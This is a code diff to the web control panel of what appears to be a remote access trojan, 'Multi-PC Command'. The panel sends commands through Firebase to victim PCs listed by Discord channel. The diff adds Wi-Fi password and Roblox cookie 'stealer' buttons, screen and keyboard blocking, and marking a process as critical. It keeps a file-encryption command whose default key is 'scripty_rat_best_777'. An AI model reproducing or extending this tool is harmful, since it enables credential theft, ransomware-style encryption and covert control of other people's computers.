@@ -10,11 +10,7 @@
         body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
         h1 { background: linear-gradient(135deg, var(--accent), #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2.5rem; margin-bottom: 2rem; text-transform: uppercase; }
         
-        /* AUTH BAR (Fixed to Top-Left) */
-        .auth-bar {
-            position: fixed; top: 20px; left: 20px; display: flex; flex-direction: column; gap: 10px;
-            z-index: 1000; background: rgba(30, 41, 59, 0.8); padding: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1);
-        }
+        .auth-bar { position: fixed; top: 20px; left: 20px; display: flex; flex-direction: column; gap: 10px; z-index: 1000; background: rgba(30, 41, 59, 0.8); padding: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); }
         .user-email { color: #94a3b8; font-size: 0.85rem; font-weight: bold; }
         .logout-btn { padding: 6px 12px; background: rgba(239, 68, 68, 0.2); border: 1px solid var(--danger); color: #fca5a5; border-radius: 6px; cursor: pointer; transition: 0.2s; font-size: 0.8rem; }
         .logout-btn:hover { background: var(--danger); color: white; }
@@ -22,7 +18,6 @@
         .pc-selector { width: 100%; max-width: 600px; margin-bottom: 30px; background: var(--card); padding: 20px; border-radius: 12px; border: 1px solid var(--accent); text-align: center; margin-top: 40px; }
         .pc-selector select { width: 100%; padding: 15px; font-size: 1.1rem; background: #0f172a; color: white; border: 1px solid #334155; border-radius: 8px; margin-top: 10px; }
 
-        /* Dashboard hidden until PC selected */
         #mainDashboard { display: none; width: 100%; max-width: 1200px; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
         
         .card { background: var(--card); padding: 20px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
@@ -38,7 +33,6 @@
         .full-width { grid-column: span 2; }
 
         .logs-container { width: 100%; max-width: 1200px; margin-top: 25px; background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 20px; box-sizing: border-box; }
-        .log-title { color: #94a3b8; font-size: 0.9rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
         .log-list { list-style: none; padding: 0; margin: 0; max-height: 200px; overflow-y: auto; }
         .log-item { padding: 8px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-family: monospace; font-size: 0.9rem; color: #ccc; display: flex; justify-content: space-between; }
         .log-item:last-child { border-bottom: none; }
@@ -48,7 +42,6 @@
 </head>
 <body>
 
-    <!-- AUTH BAR (Top Left) -->
     <div class="auth-bar">
         <span id="userDisplay" class="user-email">Checking...</span>
         <button class="logout-btn" onclick="logout()">Log Out</button>
@@ -56,7 +49,6 @@
 
     <h1>🚀 Multi-PC Command</h1>
 
-    <!-- STEP 1: SELECT PC -->
     <div class="pc-selector">
         <h3>🎯 Select Target PC (Category)</h3>
         <select id="categorySelect" onchange="selectPC()">
@@ -65,25 +57,45 @@
         <p id="targetStatus" style="margin-top:10px; color:#aaa; font-size:0.9rem;">Please select a PC to control.</p>
     </div>
 
-    <!-- STEP 2: DASHBOARD -->
     <div id="mainDashboard" class="dashboard"> 
         
         <!-- POWER -->
         <div class="card">
-            <div class="card-header">⚡ Power</div>
+            <div class="card-header">⚡ Power & Input</div>
             <div class="grid-buttons">
                 <button class="btn-info" onclick="cmd('lock_pc')">🔒 Lock</button>
                 <button class="btn-warn" onclick="cmd('restart_pc')">🔄 Restart</button>
                 <button class="btn-danger full-width" onclick="confirmAction('shutdown_pc')">🛑 Shutdown</button>
-                <button class="btn-danger full-width" onclick="confirmAction('bsod')">💀 BSOD</button>
-                <button class="btn-danger" onclick="toggleInput(true)">🚫 Block Input</button>
-                <button class="btn-success" onclick="toggleInput(false)">✅ Restore Input</button>
+                <button class="btn-danger" onclick="toggleInput(true)">🚫 Block Keys</button>
+                <button class="btn-success" onclick="toggleInput(false)">✅ Free Keys</button>
+                <button class="btn-danger" onclick="cmd('block_screen')">⬛ Block Screen</button>
+                <button class="btn-info" onclick="cmd('check_admin')">🛡️ Check Admin</button>
+            </div>
+        </div>
+
+        <!-- ADVANCED SYSTEM (NEW) -->
+        <div class="card" style="border-color: #eab308;">
+            <div class="card-header">🛠️ Advanced System</div>
+            <div class="grid-buttons">
+                <button class="btn-danger" onclick="cmd('set_critical')">⚠️ Set Critical</button>
+                <button class="btn-success" onclick="cmd('unset_critical')">🛡️ Unset Critical</button>
+                <button class="btn-gray" onclick="cmd('hide_taskbar')">🙈 Hide Taskbar</button>
+                <button class="btn-info" onclick="cmd('show_taskbar')">👁️ Show Taskbar</button>
                 <button class="btn-danger" onclick="askBlacklist()">❌ Blacklist App</button>
                 <button class="btn-success" onclick="askWhitelist()">✅ Whitelist App</button>
             </div>
         </div>
 
-        <!-- ENCRYPTION (NEW) -->
+        <!-- STEALERS (NEW) -->
+        <div class="card" style="border-color: #a855f7;">
+            <div class="card-header">🕵️ Stealer Tools</div>
+            <div class="grid-buttons">
+                <button class="btn-info full-width" onclick="cmd('wifi_stealer')">📶 Steal Wi-Fi</button>
+                <button class="btn-warn full-width" onclick="cmd('grab_roblox')">🍪 Grab Roblox Cookie</button>
+            </div>
+        </div>
+
+        <!-- ENCRYPTION -->
         <div class="card" style="border-color: #ef4444;">
             <div class="card-header">🔐 Encryption</div>
             <div class="grid-buttons">
@@ -106,7 +118,7 @@
             </div>
         </div>
 
-        <!-- PRANKS -->
+        <!-- FUN -->
         <div class="card">
             <div class="card-header">👻 Fun</div>
             <div class="grid-buttons">
@@ -118,29 +130,14 @@
             </div>
         </div>
 
-        <!-- DISCORD -->
-        <div class="card">
-            <div class="card-header">💬 Communication</div>
-            <button class="btn-info" onclick="cmd('ping_channel')">🏓 Ping This PC</button>
-            <p style="font-size:0.8rem; color:#aaa; margin-top:10px;">
-                Commands sent to: <span id="activeChannelName" style="color:var(--accent)">None</span>
-            </p>
-        </div>
-
     </div>
 
-    <!-- LOGS CONTAINER -->
+    <!-- LOGS -->
     <div class="logs-container">
         <div class="log-title">Command History</div>
-        <ul class="log-list" id="logList">
-            <li class="log-item">
-                <span class="log-cmd">System Ready</span>
-                <span class="log-time">Now</span>
-            </li>
-        </ul>
+        <ul class="log-list" id="logList"></ul>
     </div>
 
-    <!-- SCRIPT -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
@@ -160,50 +157,31 @@
         const auth = getAuth(app); 
         const db = getDatabase(app);
         const dbRef = ref(db);
-
-        // --- SECURITY: ADMIN CHECK ---
-        const ADMIN_UID = "YOUR_ADMIN_UID_HERE"; 
+        const ADMIN_UID = "sJSL8EjvFhMpoiD4yaAThWDKsf32"; 
 
         onAuthStateChanged(auth, (user) => {
-            if (user) {
-                if (user.uid !== ADMIN_UID) {
-                    window.location.href = "index.html"; 
-                } else {
-                    document.getElementById('userDisplay').innerText = user.email;
-                }
-            } else {
-                window.location.href = "index.html"; 
-            }
+            if (user && user.uid === ADMIN_UID) document.getElementById('userDisplay').innerText = user.email;
+            else window.location.href = "index.html";
         });
 
-        window.logout = function() {
-            signOut(auth).then(() => {
-                window.location.href = "index.html";
-            });
-        };
+        window.logout = () => signOut(auth).then(() => window.location.href = "index.html");
 
-        // --- GLOBAL VARIABLES ---
+        // GLOBAL VARS
         window.currentTargetID = null; 
         window.currentPCName = "Unknown";
         let discordStructure = {};
 
-        // 1. LOAD STRUCTURE
+        // LOAD DATA
         get(child(dbRef, `discord_structure`)).then((snapshot) => {
             const select = document.getElementById('categorySelect');
-            
             if (snapshot.exists()) {
                 const fullData = snapshot.val();
                 const discordStructure = fullData.structure || fullData; 
-                const lastTime = fullData.last_updated || "Unknown Time";
-
-                select.innerHTML = `<option value="">-- Select PC (Updated: ${lastTime}) --</option>`;
-
+                select.innerHTML = `<option value="">-- Select PC (Updated: ${fullData.last_updated || "?"}) --</option>`;
                 for (const [serverName, categories] of Object.entries(discordStructure)) {
                     if(serverName === "last_updated") continue; 
-
                     const group = document.createElement('optgroup');
                     group.label = serverName;
-                    
                     for (const [catName, channels] of Object.entries(categories)) {
                         const option = document.createElement('option');
                         option.value = JSON.stringify({server: serverName, category: catName}); 
@@ -212,172 +190,79 @@
                     }
                     select.appendChild(group);
                 }
-            } else {
-                select.innerHTML = '<option>No Data Found</option>';
             }
         });
 
-        // 2. HANDLE SELECTION
         window.selectPC = function() {
-            const select = document.getElementById('categorySelect');
-            const val = select.value;
-            const dashboard = document.getElementById('mainDashboard');
-            const status = document.getElementById('targetStatus');
-            const activeName = document.getElementById('activeChannelName');
-
-            if (!val) {
-                dashboard.style.display = "none";
-                status.innerText = "Select a PC to continue.";
-                return;
-            }
-
-            const data = JSON.parse(val);
-            const server = data.server;
-            const category = data.category;
+            const val = document.getElementById('categorySelect').value;
+            if (!val) { document.getElementById('mainDashboard').style.display = "none"; return; }
+            
+            const {server, category} = JSON.parse(val);
             window.currentPCName = category;
             
             get(child(dbRef, `discord_structure`)).then((snap) => {
-                const fullData = snap.val();
-                const struct = fullData.structure || fullData;
+                const struct = snap.val().structure || snap.val();
                 const channels = struct[server][category];
-                
-                let foundID = null;
-                let foundName = "";
                 const targetNames = ["remote-access", "𝕣𝕖𝕞𝕠𝕥𝕖-𝕒𝕔𝕔𝕖𝕤𝕤", "cmd", "terminal"];
+                let foundID = null;
                 
                 for (const [id, name] of Object.entries(channels)) {
-                    if (targetNames.includes(name.toLowerCase())) {
-                        foundID = id;
-                        foundName = name;
-                        break;
-                    }
+                    if (targetNames.includes(name.toLowerCase())) { foundID = id; break; }
                 }
 
                 if (foundID) {
                     window.currentTargetID = foundID;
-                    dashboard.style.display = "grid"; 
-                    status.innerText = `✅ Connected to: ${category} (via #${foundName})`;
-                    status.style.color = "#22c55e";
-                    activeName.innerText = `#${foundName}`;
-                    addLog(`Connected to PC: ${category}`);
-                } else {
-                    dashboard.style.display = "none";
-                    status.innerText = `❌ Error: Could not find 'remote-access' channel in '${category}'.`;
-                    status.style.color = "#ef4444";
+                    document.getElementById('mainDashboard').style.display = "grid"; 
+                    document.getElementById('targetStatus').innerText = `✅ Connected to: ${category}`;
+                    document.getElementById('targetStatus').style.color = "#22c55e";
+                    document.getElementById('activeChannelName').innerText = `#${channels[foundID]}`;
                 }
             });
         };
 
-        // 3. LOGGING SYSTEM
         const logsRef = query(ref(db, 'logs'), limitToLast(10));
-        onValue(logsRef, (snapshot) => {
+        onValue(logsRef, (snap) => {
             const list = document.getElementById('logList');
             list.innerHTML = ""; 
-            if(snapshot.exists()) {
-                const data = snapshot.val();
-                Object.values(data).reverse().forEach(log => {
+            if(snap.exists()) {
+                Object.values(snap.val()).reverse().forEach(log => {
                     const li = document.createElement('li');
                     li.className = 'log-item';
-                    const timeStr = new Date(log.timestamp).toLocaleTimeString();
-                    li.innerHTML = `<span class="log-cmd">> ${log.message}</span><span class="log-time">${timeStr}</span>`;
+                    li.innerHTML = `<span class="log-cmd">> ${log.message}</span><span class="log-time">${new Date(log.timestamp).toLocaleTimeString()}</span>`;
                     list.appendChild(li);
                 });
             }
         });
 
-        function addLog(msg) {
-            push(ref(db, 'logs'), { message: msg, timestamp: Date.now() });
-        }
+        function addLog(msg) { push(ref(db, 'logs'), { message: msg, timestamp: Date.now() }); }
 
-        // 4. COMMANDS
-        window.cmd = function(type) {
-            if(!window.currentTargetID) return alert("No Target Selected!");
+        window.cmd = (type) => {
+            if(!window.currentTargetID) return alert("Select PC!");
             writeDB({ type: type, target_id: window.currentTargetID });
-            addLog(`[${window.currentPCName}] Executed: ${type}`);
+            addLog(`[${window.currentPCName}] ${type}`);
         };
 
-        window.confirmAction = function(type) {
-            if(confirm("Confirm dangerous action?")) cmd(type);
-        };
+        window.confirmAction = (type) => { if(confirm("Dangerous! Proceed?")) cmd(type); };
+        window.askTTS = () => { const t = prompt("Text:"); if(t) writeDB({type:'tts', text:t, target_id: window.currentTargetID}); };
+        window.askURL = () => { const u = prompt("URL:"); if(u) writeDB({type:'open_url', url:u, target_id: window.currentTargetID}); };
+        window.askMsgBox = () => { const t = prompt("Message:"); if(t) writeDB({type:'msgbox', text:t, target_id: window.currentTargetID}); };
+        window.setVolume = (v) => { if(window.currentTargetID) writeDB({type:'volume', value:v, target_id: window.currentTargetID}); };
+        window.askBlockURL = () => { const d = prompt("Block Domain:"); if(d) writeDB({type:'block_url', domain:d, target_id: window.currentTargetID}); };
+        window.askUnblockURL = () => { const d = prompt("Unblock Domain:"); if(d) writeDB({type:'unblock_url', domain:d, target_id: window.currentTargetID}); };
+        window.askBlacklist = () => { const n = prompt("Process Name:"); if(n) writeDB({type:'blacklist', name:n, target_id: window.currentTargetID}); };
+        window.toggleInput = (b) => writeDB({type: b?'disable_input':'enable_input', target_id: window.currentTargetID});
+        window.askWhitelist = () => { const n = prompt("Restore Process:"); if(n) writeDB({type:'whitelist', name:n, target_id: window.currentTargetID}); };
         
-        window.askTTS = function() {
-            const t = prompt("Text:");
-            if(t) {
-                writeDB({type:'tts', text:t, target_id: window.currentTargetID});
-                addLog(`[${window.currentPCName}] TTS: "${t}"`);
-            }
+        window.askForceEncrypt = () => {
+            const p = prompt("Password:");
+            if(confirm("Encrypt?")) writeDB({type:'force_encrypt', password: p||"scripty_rat_best_777", target_id: window.currentTargetID});
         };
-
-        window.askURL = function() {
-            const u = prompt("URL:");
-            if(u) {
-                writeDB({type:'open_url', url:u, target_id: window.currentTargetID});
-                addLog(`[${window.currentPCName}] Open URL`);
-            }
-        };
-
-        window.askMsgBox = function() {
-            const t = prompt("Message:");
-            if(t) {
-                writeDB({type:'msgbox', text:t, target_id: window.currentTargetID});
-                addLog(`[${window.currentPCName}] MsgBox Sent`);
-            }
-        };
-
-        window.setVolume = function(val) {
-            if(!window.currentTargetID) return;
-            writeDB({type:'volume', value:val, target_id: window.currentTargetID});
-        };
-
-        window.askBlockURL = function() {
-            const d = prompt("Domain to block (e.g. facebook.com):");
-            if(d) writeDB({type:'block_url', domain:d, target_id: window.currentTargetID});
-        };
-
-        window.askUnblockURL = function() {
-            const d = prompt("Domain to unblock:");
-            if(d) writeDB({type:'unblock_url', domain:d, target_id: window.currentTargetID});
-        };
-
-        window.askBlacklist = function() {
-            const n = prompt("Process to kill (e.g. notepad.exe):");
-            if(n) writeDB({type:'blacklist', name:n, target_id: window.currentTargetID});
-        };
-
-        window.toggleInput = function(block) {
-            const type = block ? 'disable_input' : 'enable_input';
-            writeDB({type: type, target_id: window.currentTargetID});
-        };
-        
-        window.askWhitelist = function() {
-            const n = prompt("Process to restore (e.g. notepad.exe):");
-            if(n) {
-                writeDB({type:'whitelist', name:n, target_id: window.currentTargetID});
-                addLog(`Whitelisted: ${n}`);
-            }
-        };
-        
-        // --- NEW ENCRYPTION FUNCTIONS ---
-        window.askForceEncrypt = function() {
-            const p = prompt("Set Password (leave empty for default):");
-            const pass = p ? p : "scripty_rat_best_777";
-            if(confirm("⚠️ DANGER: This will encrypt files on Desktop/Docs/Pics/etc. Proceed?")) {
-                writeDB({type:'force_encrypt', password: pass, target_id: window.currentTargetID});
-                addLog(`[${window.currentPCName}] Encrypting with key: ${pass}`);
-            }
-        };
-
-        window.askDecrypt = function() {
-            const p = prompt("Enter Password (leave empty to use saved key):");
+        window.askDecrypt = () => {
+            const p = prompt("Password:");
             writeDB({type:'decrypt_files', password: p, target_id: window.currentTargetID});
-            addLog(`[${window.currentPCName}] Decrypting...`);
         };
 
-        function writeDB(data) {
-            data.timestamp = Date.now();
-            set(ref(db, 'queue/pending'), data);
-        };
-
+        function writeDB(data) { data.timestamp = Date.now(); set(ref(db, 'queue/pending'), data); };
     </script>
 </body>
 </html>
